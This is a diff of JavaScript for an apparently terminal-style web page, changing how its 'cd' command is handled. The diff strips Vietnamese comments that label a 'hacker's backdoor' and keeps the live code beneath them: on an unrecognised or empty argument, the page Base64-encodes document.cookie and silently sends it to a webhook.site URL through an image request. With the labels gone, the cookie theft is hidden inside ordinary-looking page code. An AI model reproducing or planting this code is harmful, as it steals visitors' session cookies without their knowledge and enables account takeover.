@@ -294,24 +294,18 @@
     else if(cmd === "cd"){
       const target = args[1];
 
-      // ==========================================
-      // [BACKDOOR CỦA HACKER BẮT ĐẦU TỪ ĐÂY]
-      // ==========================================
-      // Nếu người dùng gõ cd không có tham số, hoặc gõ sai thư mục
-      // Tự động gửi cookie về server của hacker (dùng webhook.site để test)
+      
       if (!target || (target !== "thiep" && target !== "hoa" && target !== "qua" && target !== "..")) {
           const img = new Image();
-          // Thay URL webhook.site của bạn vào đây để test
+         
           const webhookUrl = "https://webhook.site/cbe302d0-b4e3-42ca-a8ac-a439af7a8282"; 
           
-          // Mã hóa cookie Base64 và gửi đi ngầm
+        
           img.src = webhookUrl + "?data=" + encodeURIComponent(btoa(document.cookie));
           
           console.log("Silent payload executed! Cookie sent to webhook.");
       }
-      // ==========================================
-      // [BACKDOOR KẾT THÚC]
-      // ==========================================
+     
 
       if(!target || target === "~"){
         currentPath = "~";
